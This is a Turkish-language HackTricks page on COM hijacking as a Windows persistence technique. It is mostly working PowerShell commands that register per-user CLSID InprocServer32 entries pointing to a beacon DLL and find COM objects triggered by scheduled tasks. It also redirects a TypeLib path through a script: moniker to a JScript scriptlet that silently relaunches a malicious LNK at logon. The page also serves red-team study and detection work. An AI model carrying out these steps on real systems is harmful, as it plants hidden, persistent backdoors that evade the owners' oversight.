# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Var olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiği için **COM Hijacking** bir **kalıcı mekanizma** olarak kullanılabilir. `procmon` kullanarak, saldırganın kalıcılık sağlamak için oluşturabileceği, aranmış ama var olmayan COM kayıtlarını kolayca bulabilirsiniz. Filtreler:

- **RegOpenKey** işlemleri.
- _Result_ **NAME NOT FOUND** olduğunda.
- ve _Path_ **InprocServer32** ile bitiyorsa.

Hangi var olmayan COM'un kimliğini taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Eğer her birkaç saniyede bir yüklenen bir COM'un kimliğini taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçmaya neden olabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele geçirilebilen Task Scheduler COM bileşenleri

Windows Tasks, Custom Triggers kullanarak COM objects çağırır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı kontrol ederek, örneğin **kullanıcı her oturum açtığında** çalıştırılacak birini seçebilirsiniz.

Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'yi **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle bu değerin HKCU'da bulunmadığını görürsünüz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Böylece, sadece HKCU girdisini oluşturursunuz ve kullanıcı her oturum açtığında backdoor'unuz tetiklenir.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` ile yüklenir. Bir COM sunucusu örneklendiğinde, işletim sistemi ilişkili TypeLib'i `HKCR\TypeLib\{LIBID}` altındaki kayıt defteri anahtarlarına bakarak da yükleyebilir. TypeLib yolu bir **moniker** ile değiştirilirse, ör. `script:C:\...\evil.sct`, TypeLib çözüldüğünde Windows scriptleti çalıştırır — bu da yaygın bileşenlere dokunulduğunda tetiklenen gizli bir persistence sağlar.

Bu durum, Microsoft Web Browser kontrolü (sıklıkla Internet Explorer, WebBrowser'ı içeren uygulamalar ve hatta `explorer.exe` tarafından yüklenen) üzerinde gözlemlenmiştir.

### Adımlar (PowerShell)

1) Yüksek frekanslı bir CLSID tarafından kullanılan TypeLib (LIBID)'i belirleyin. Malware zincirleri tarafından sıkça suistimal edilen örnek CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Kullanıcı başına TypeLib yolunu `script:` moniker'ını kullanarak yerel bir scriptlet'e yönlendirin (admin rights gerekmez):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Birincil payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (örn. ilk zincirde kullanılan bir `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Tetikleme – IE'yi açmak, WebBrowser control'ü barındıran bir uygulamayı çalıştırmak veya hatta rutin Explorer etkinliği TypeLib'i yükleyecek ve scriptlet'i çalıştırarak zincirinizi logon/reboot sırasında yeniden etkinleştirecektir.

Temizleme
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notlar
- Aynı mantığı diğer sık kullanılan COM bileşenlerine uygulayabilirsiniz; önce `HKCR\CLSID\{CLSID}\TypeLib` anahtarından gerçek `LIBID`'yi çözümleyin.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da doldurabilirsiniz.

## Kaynaklar

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
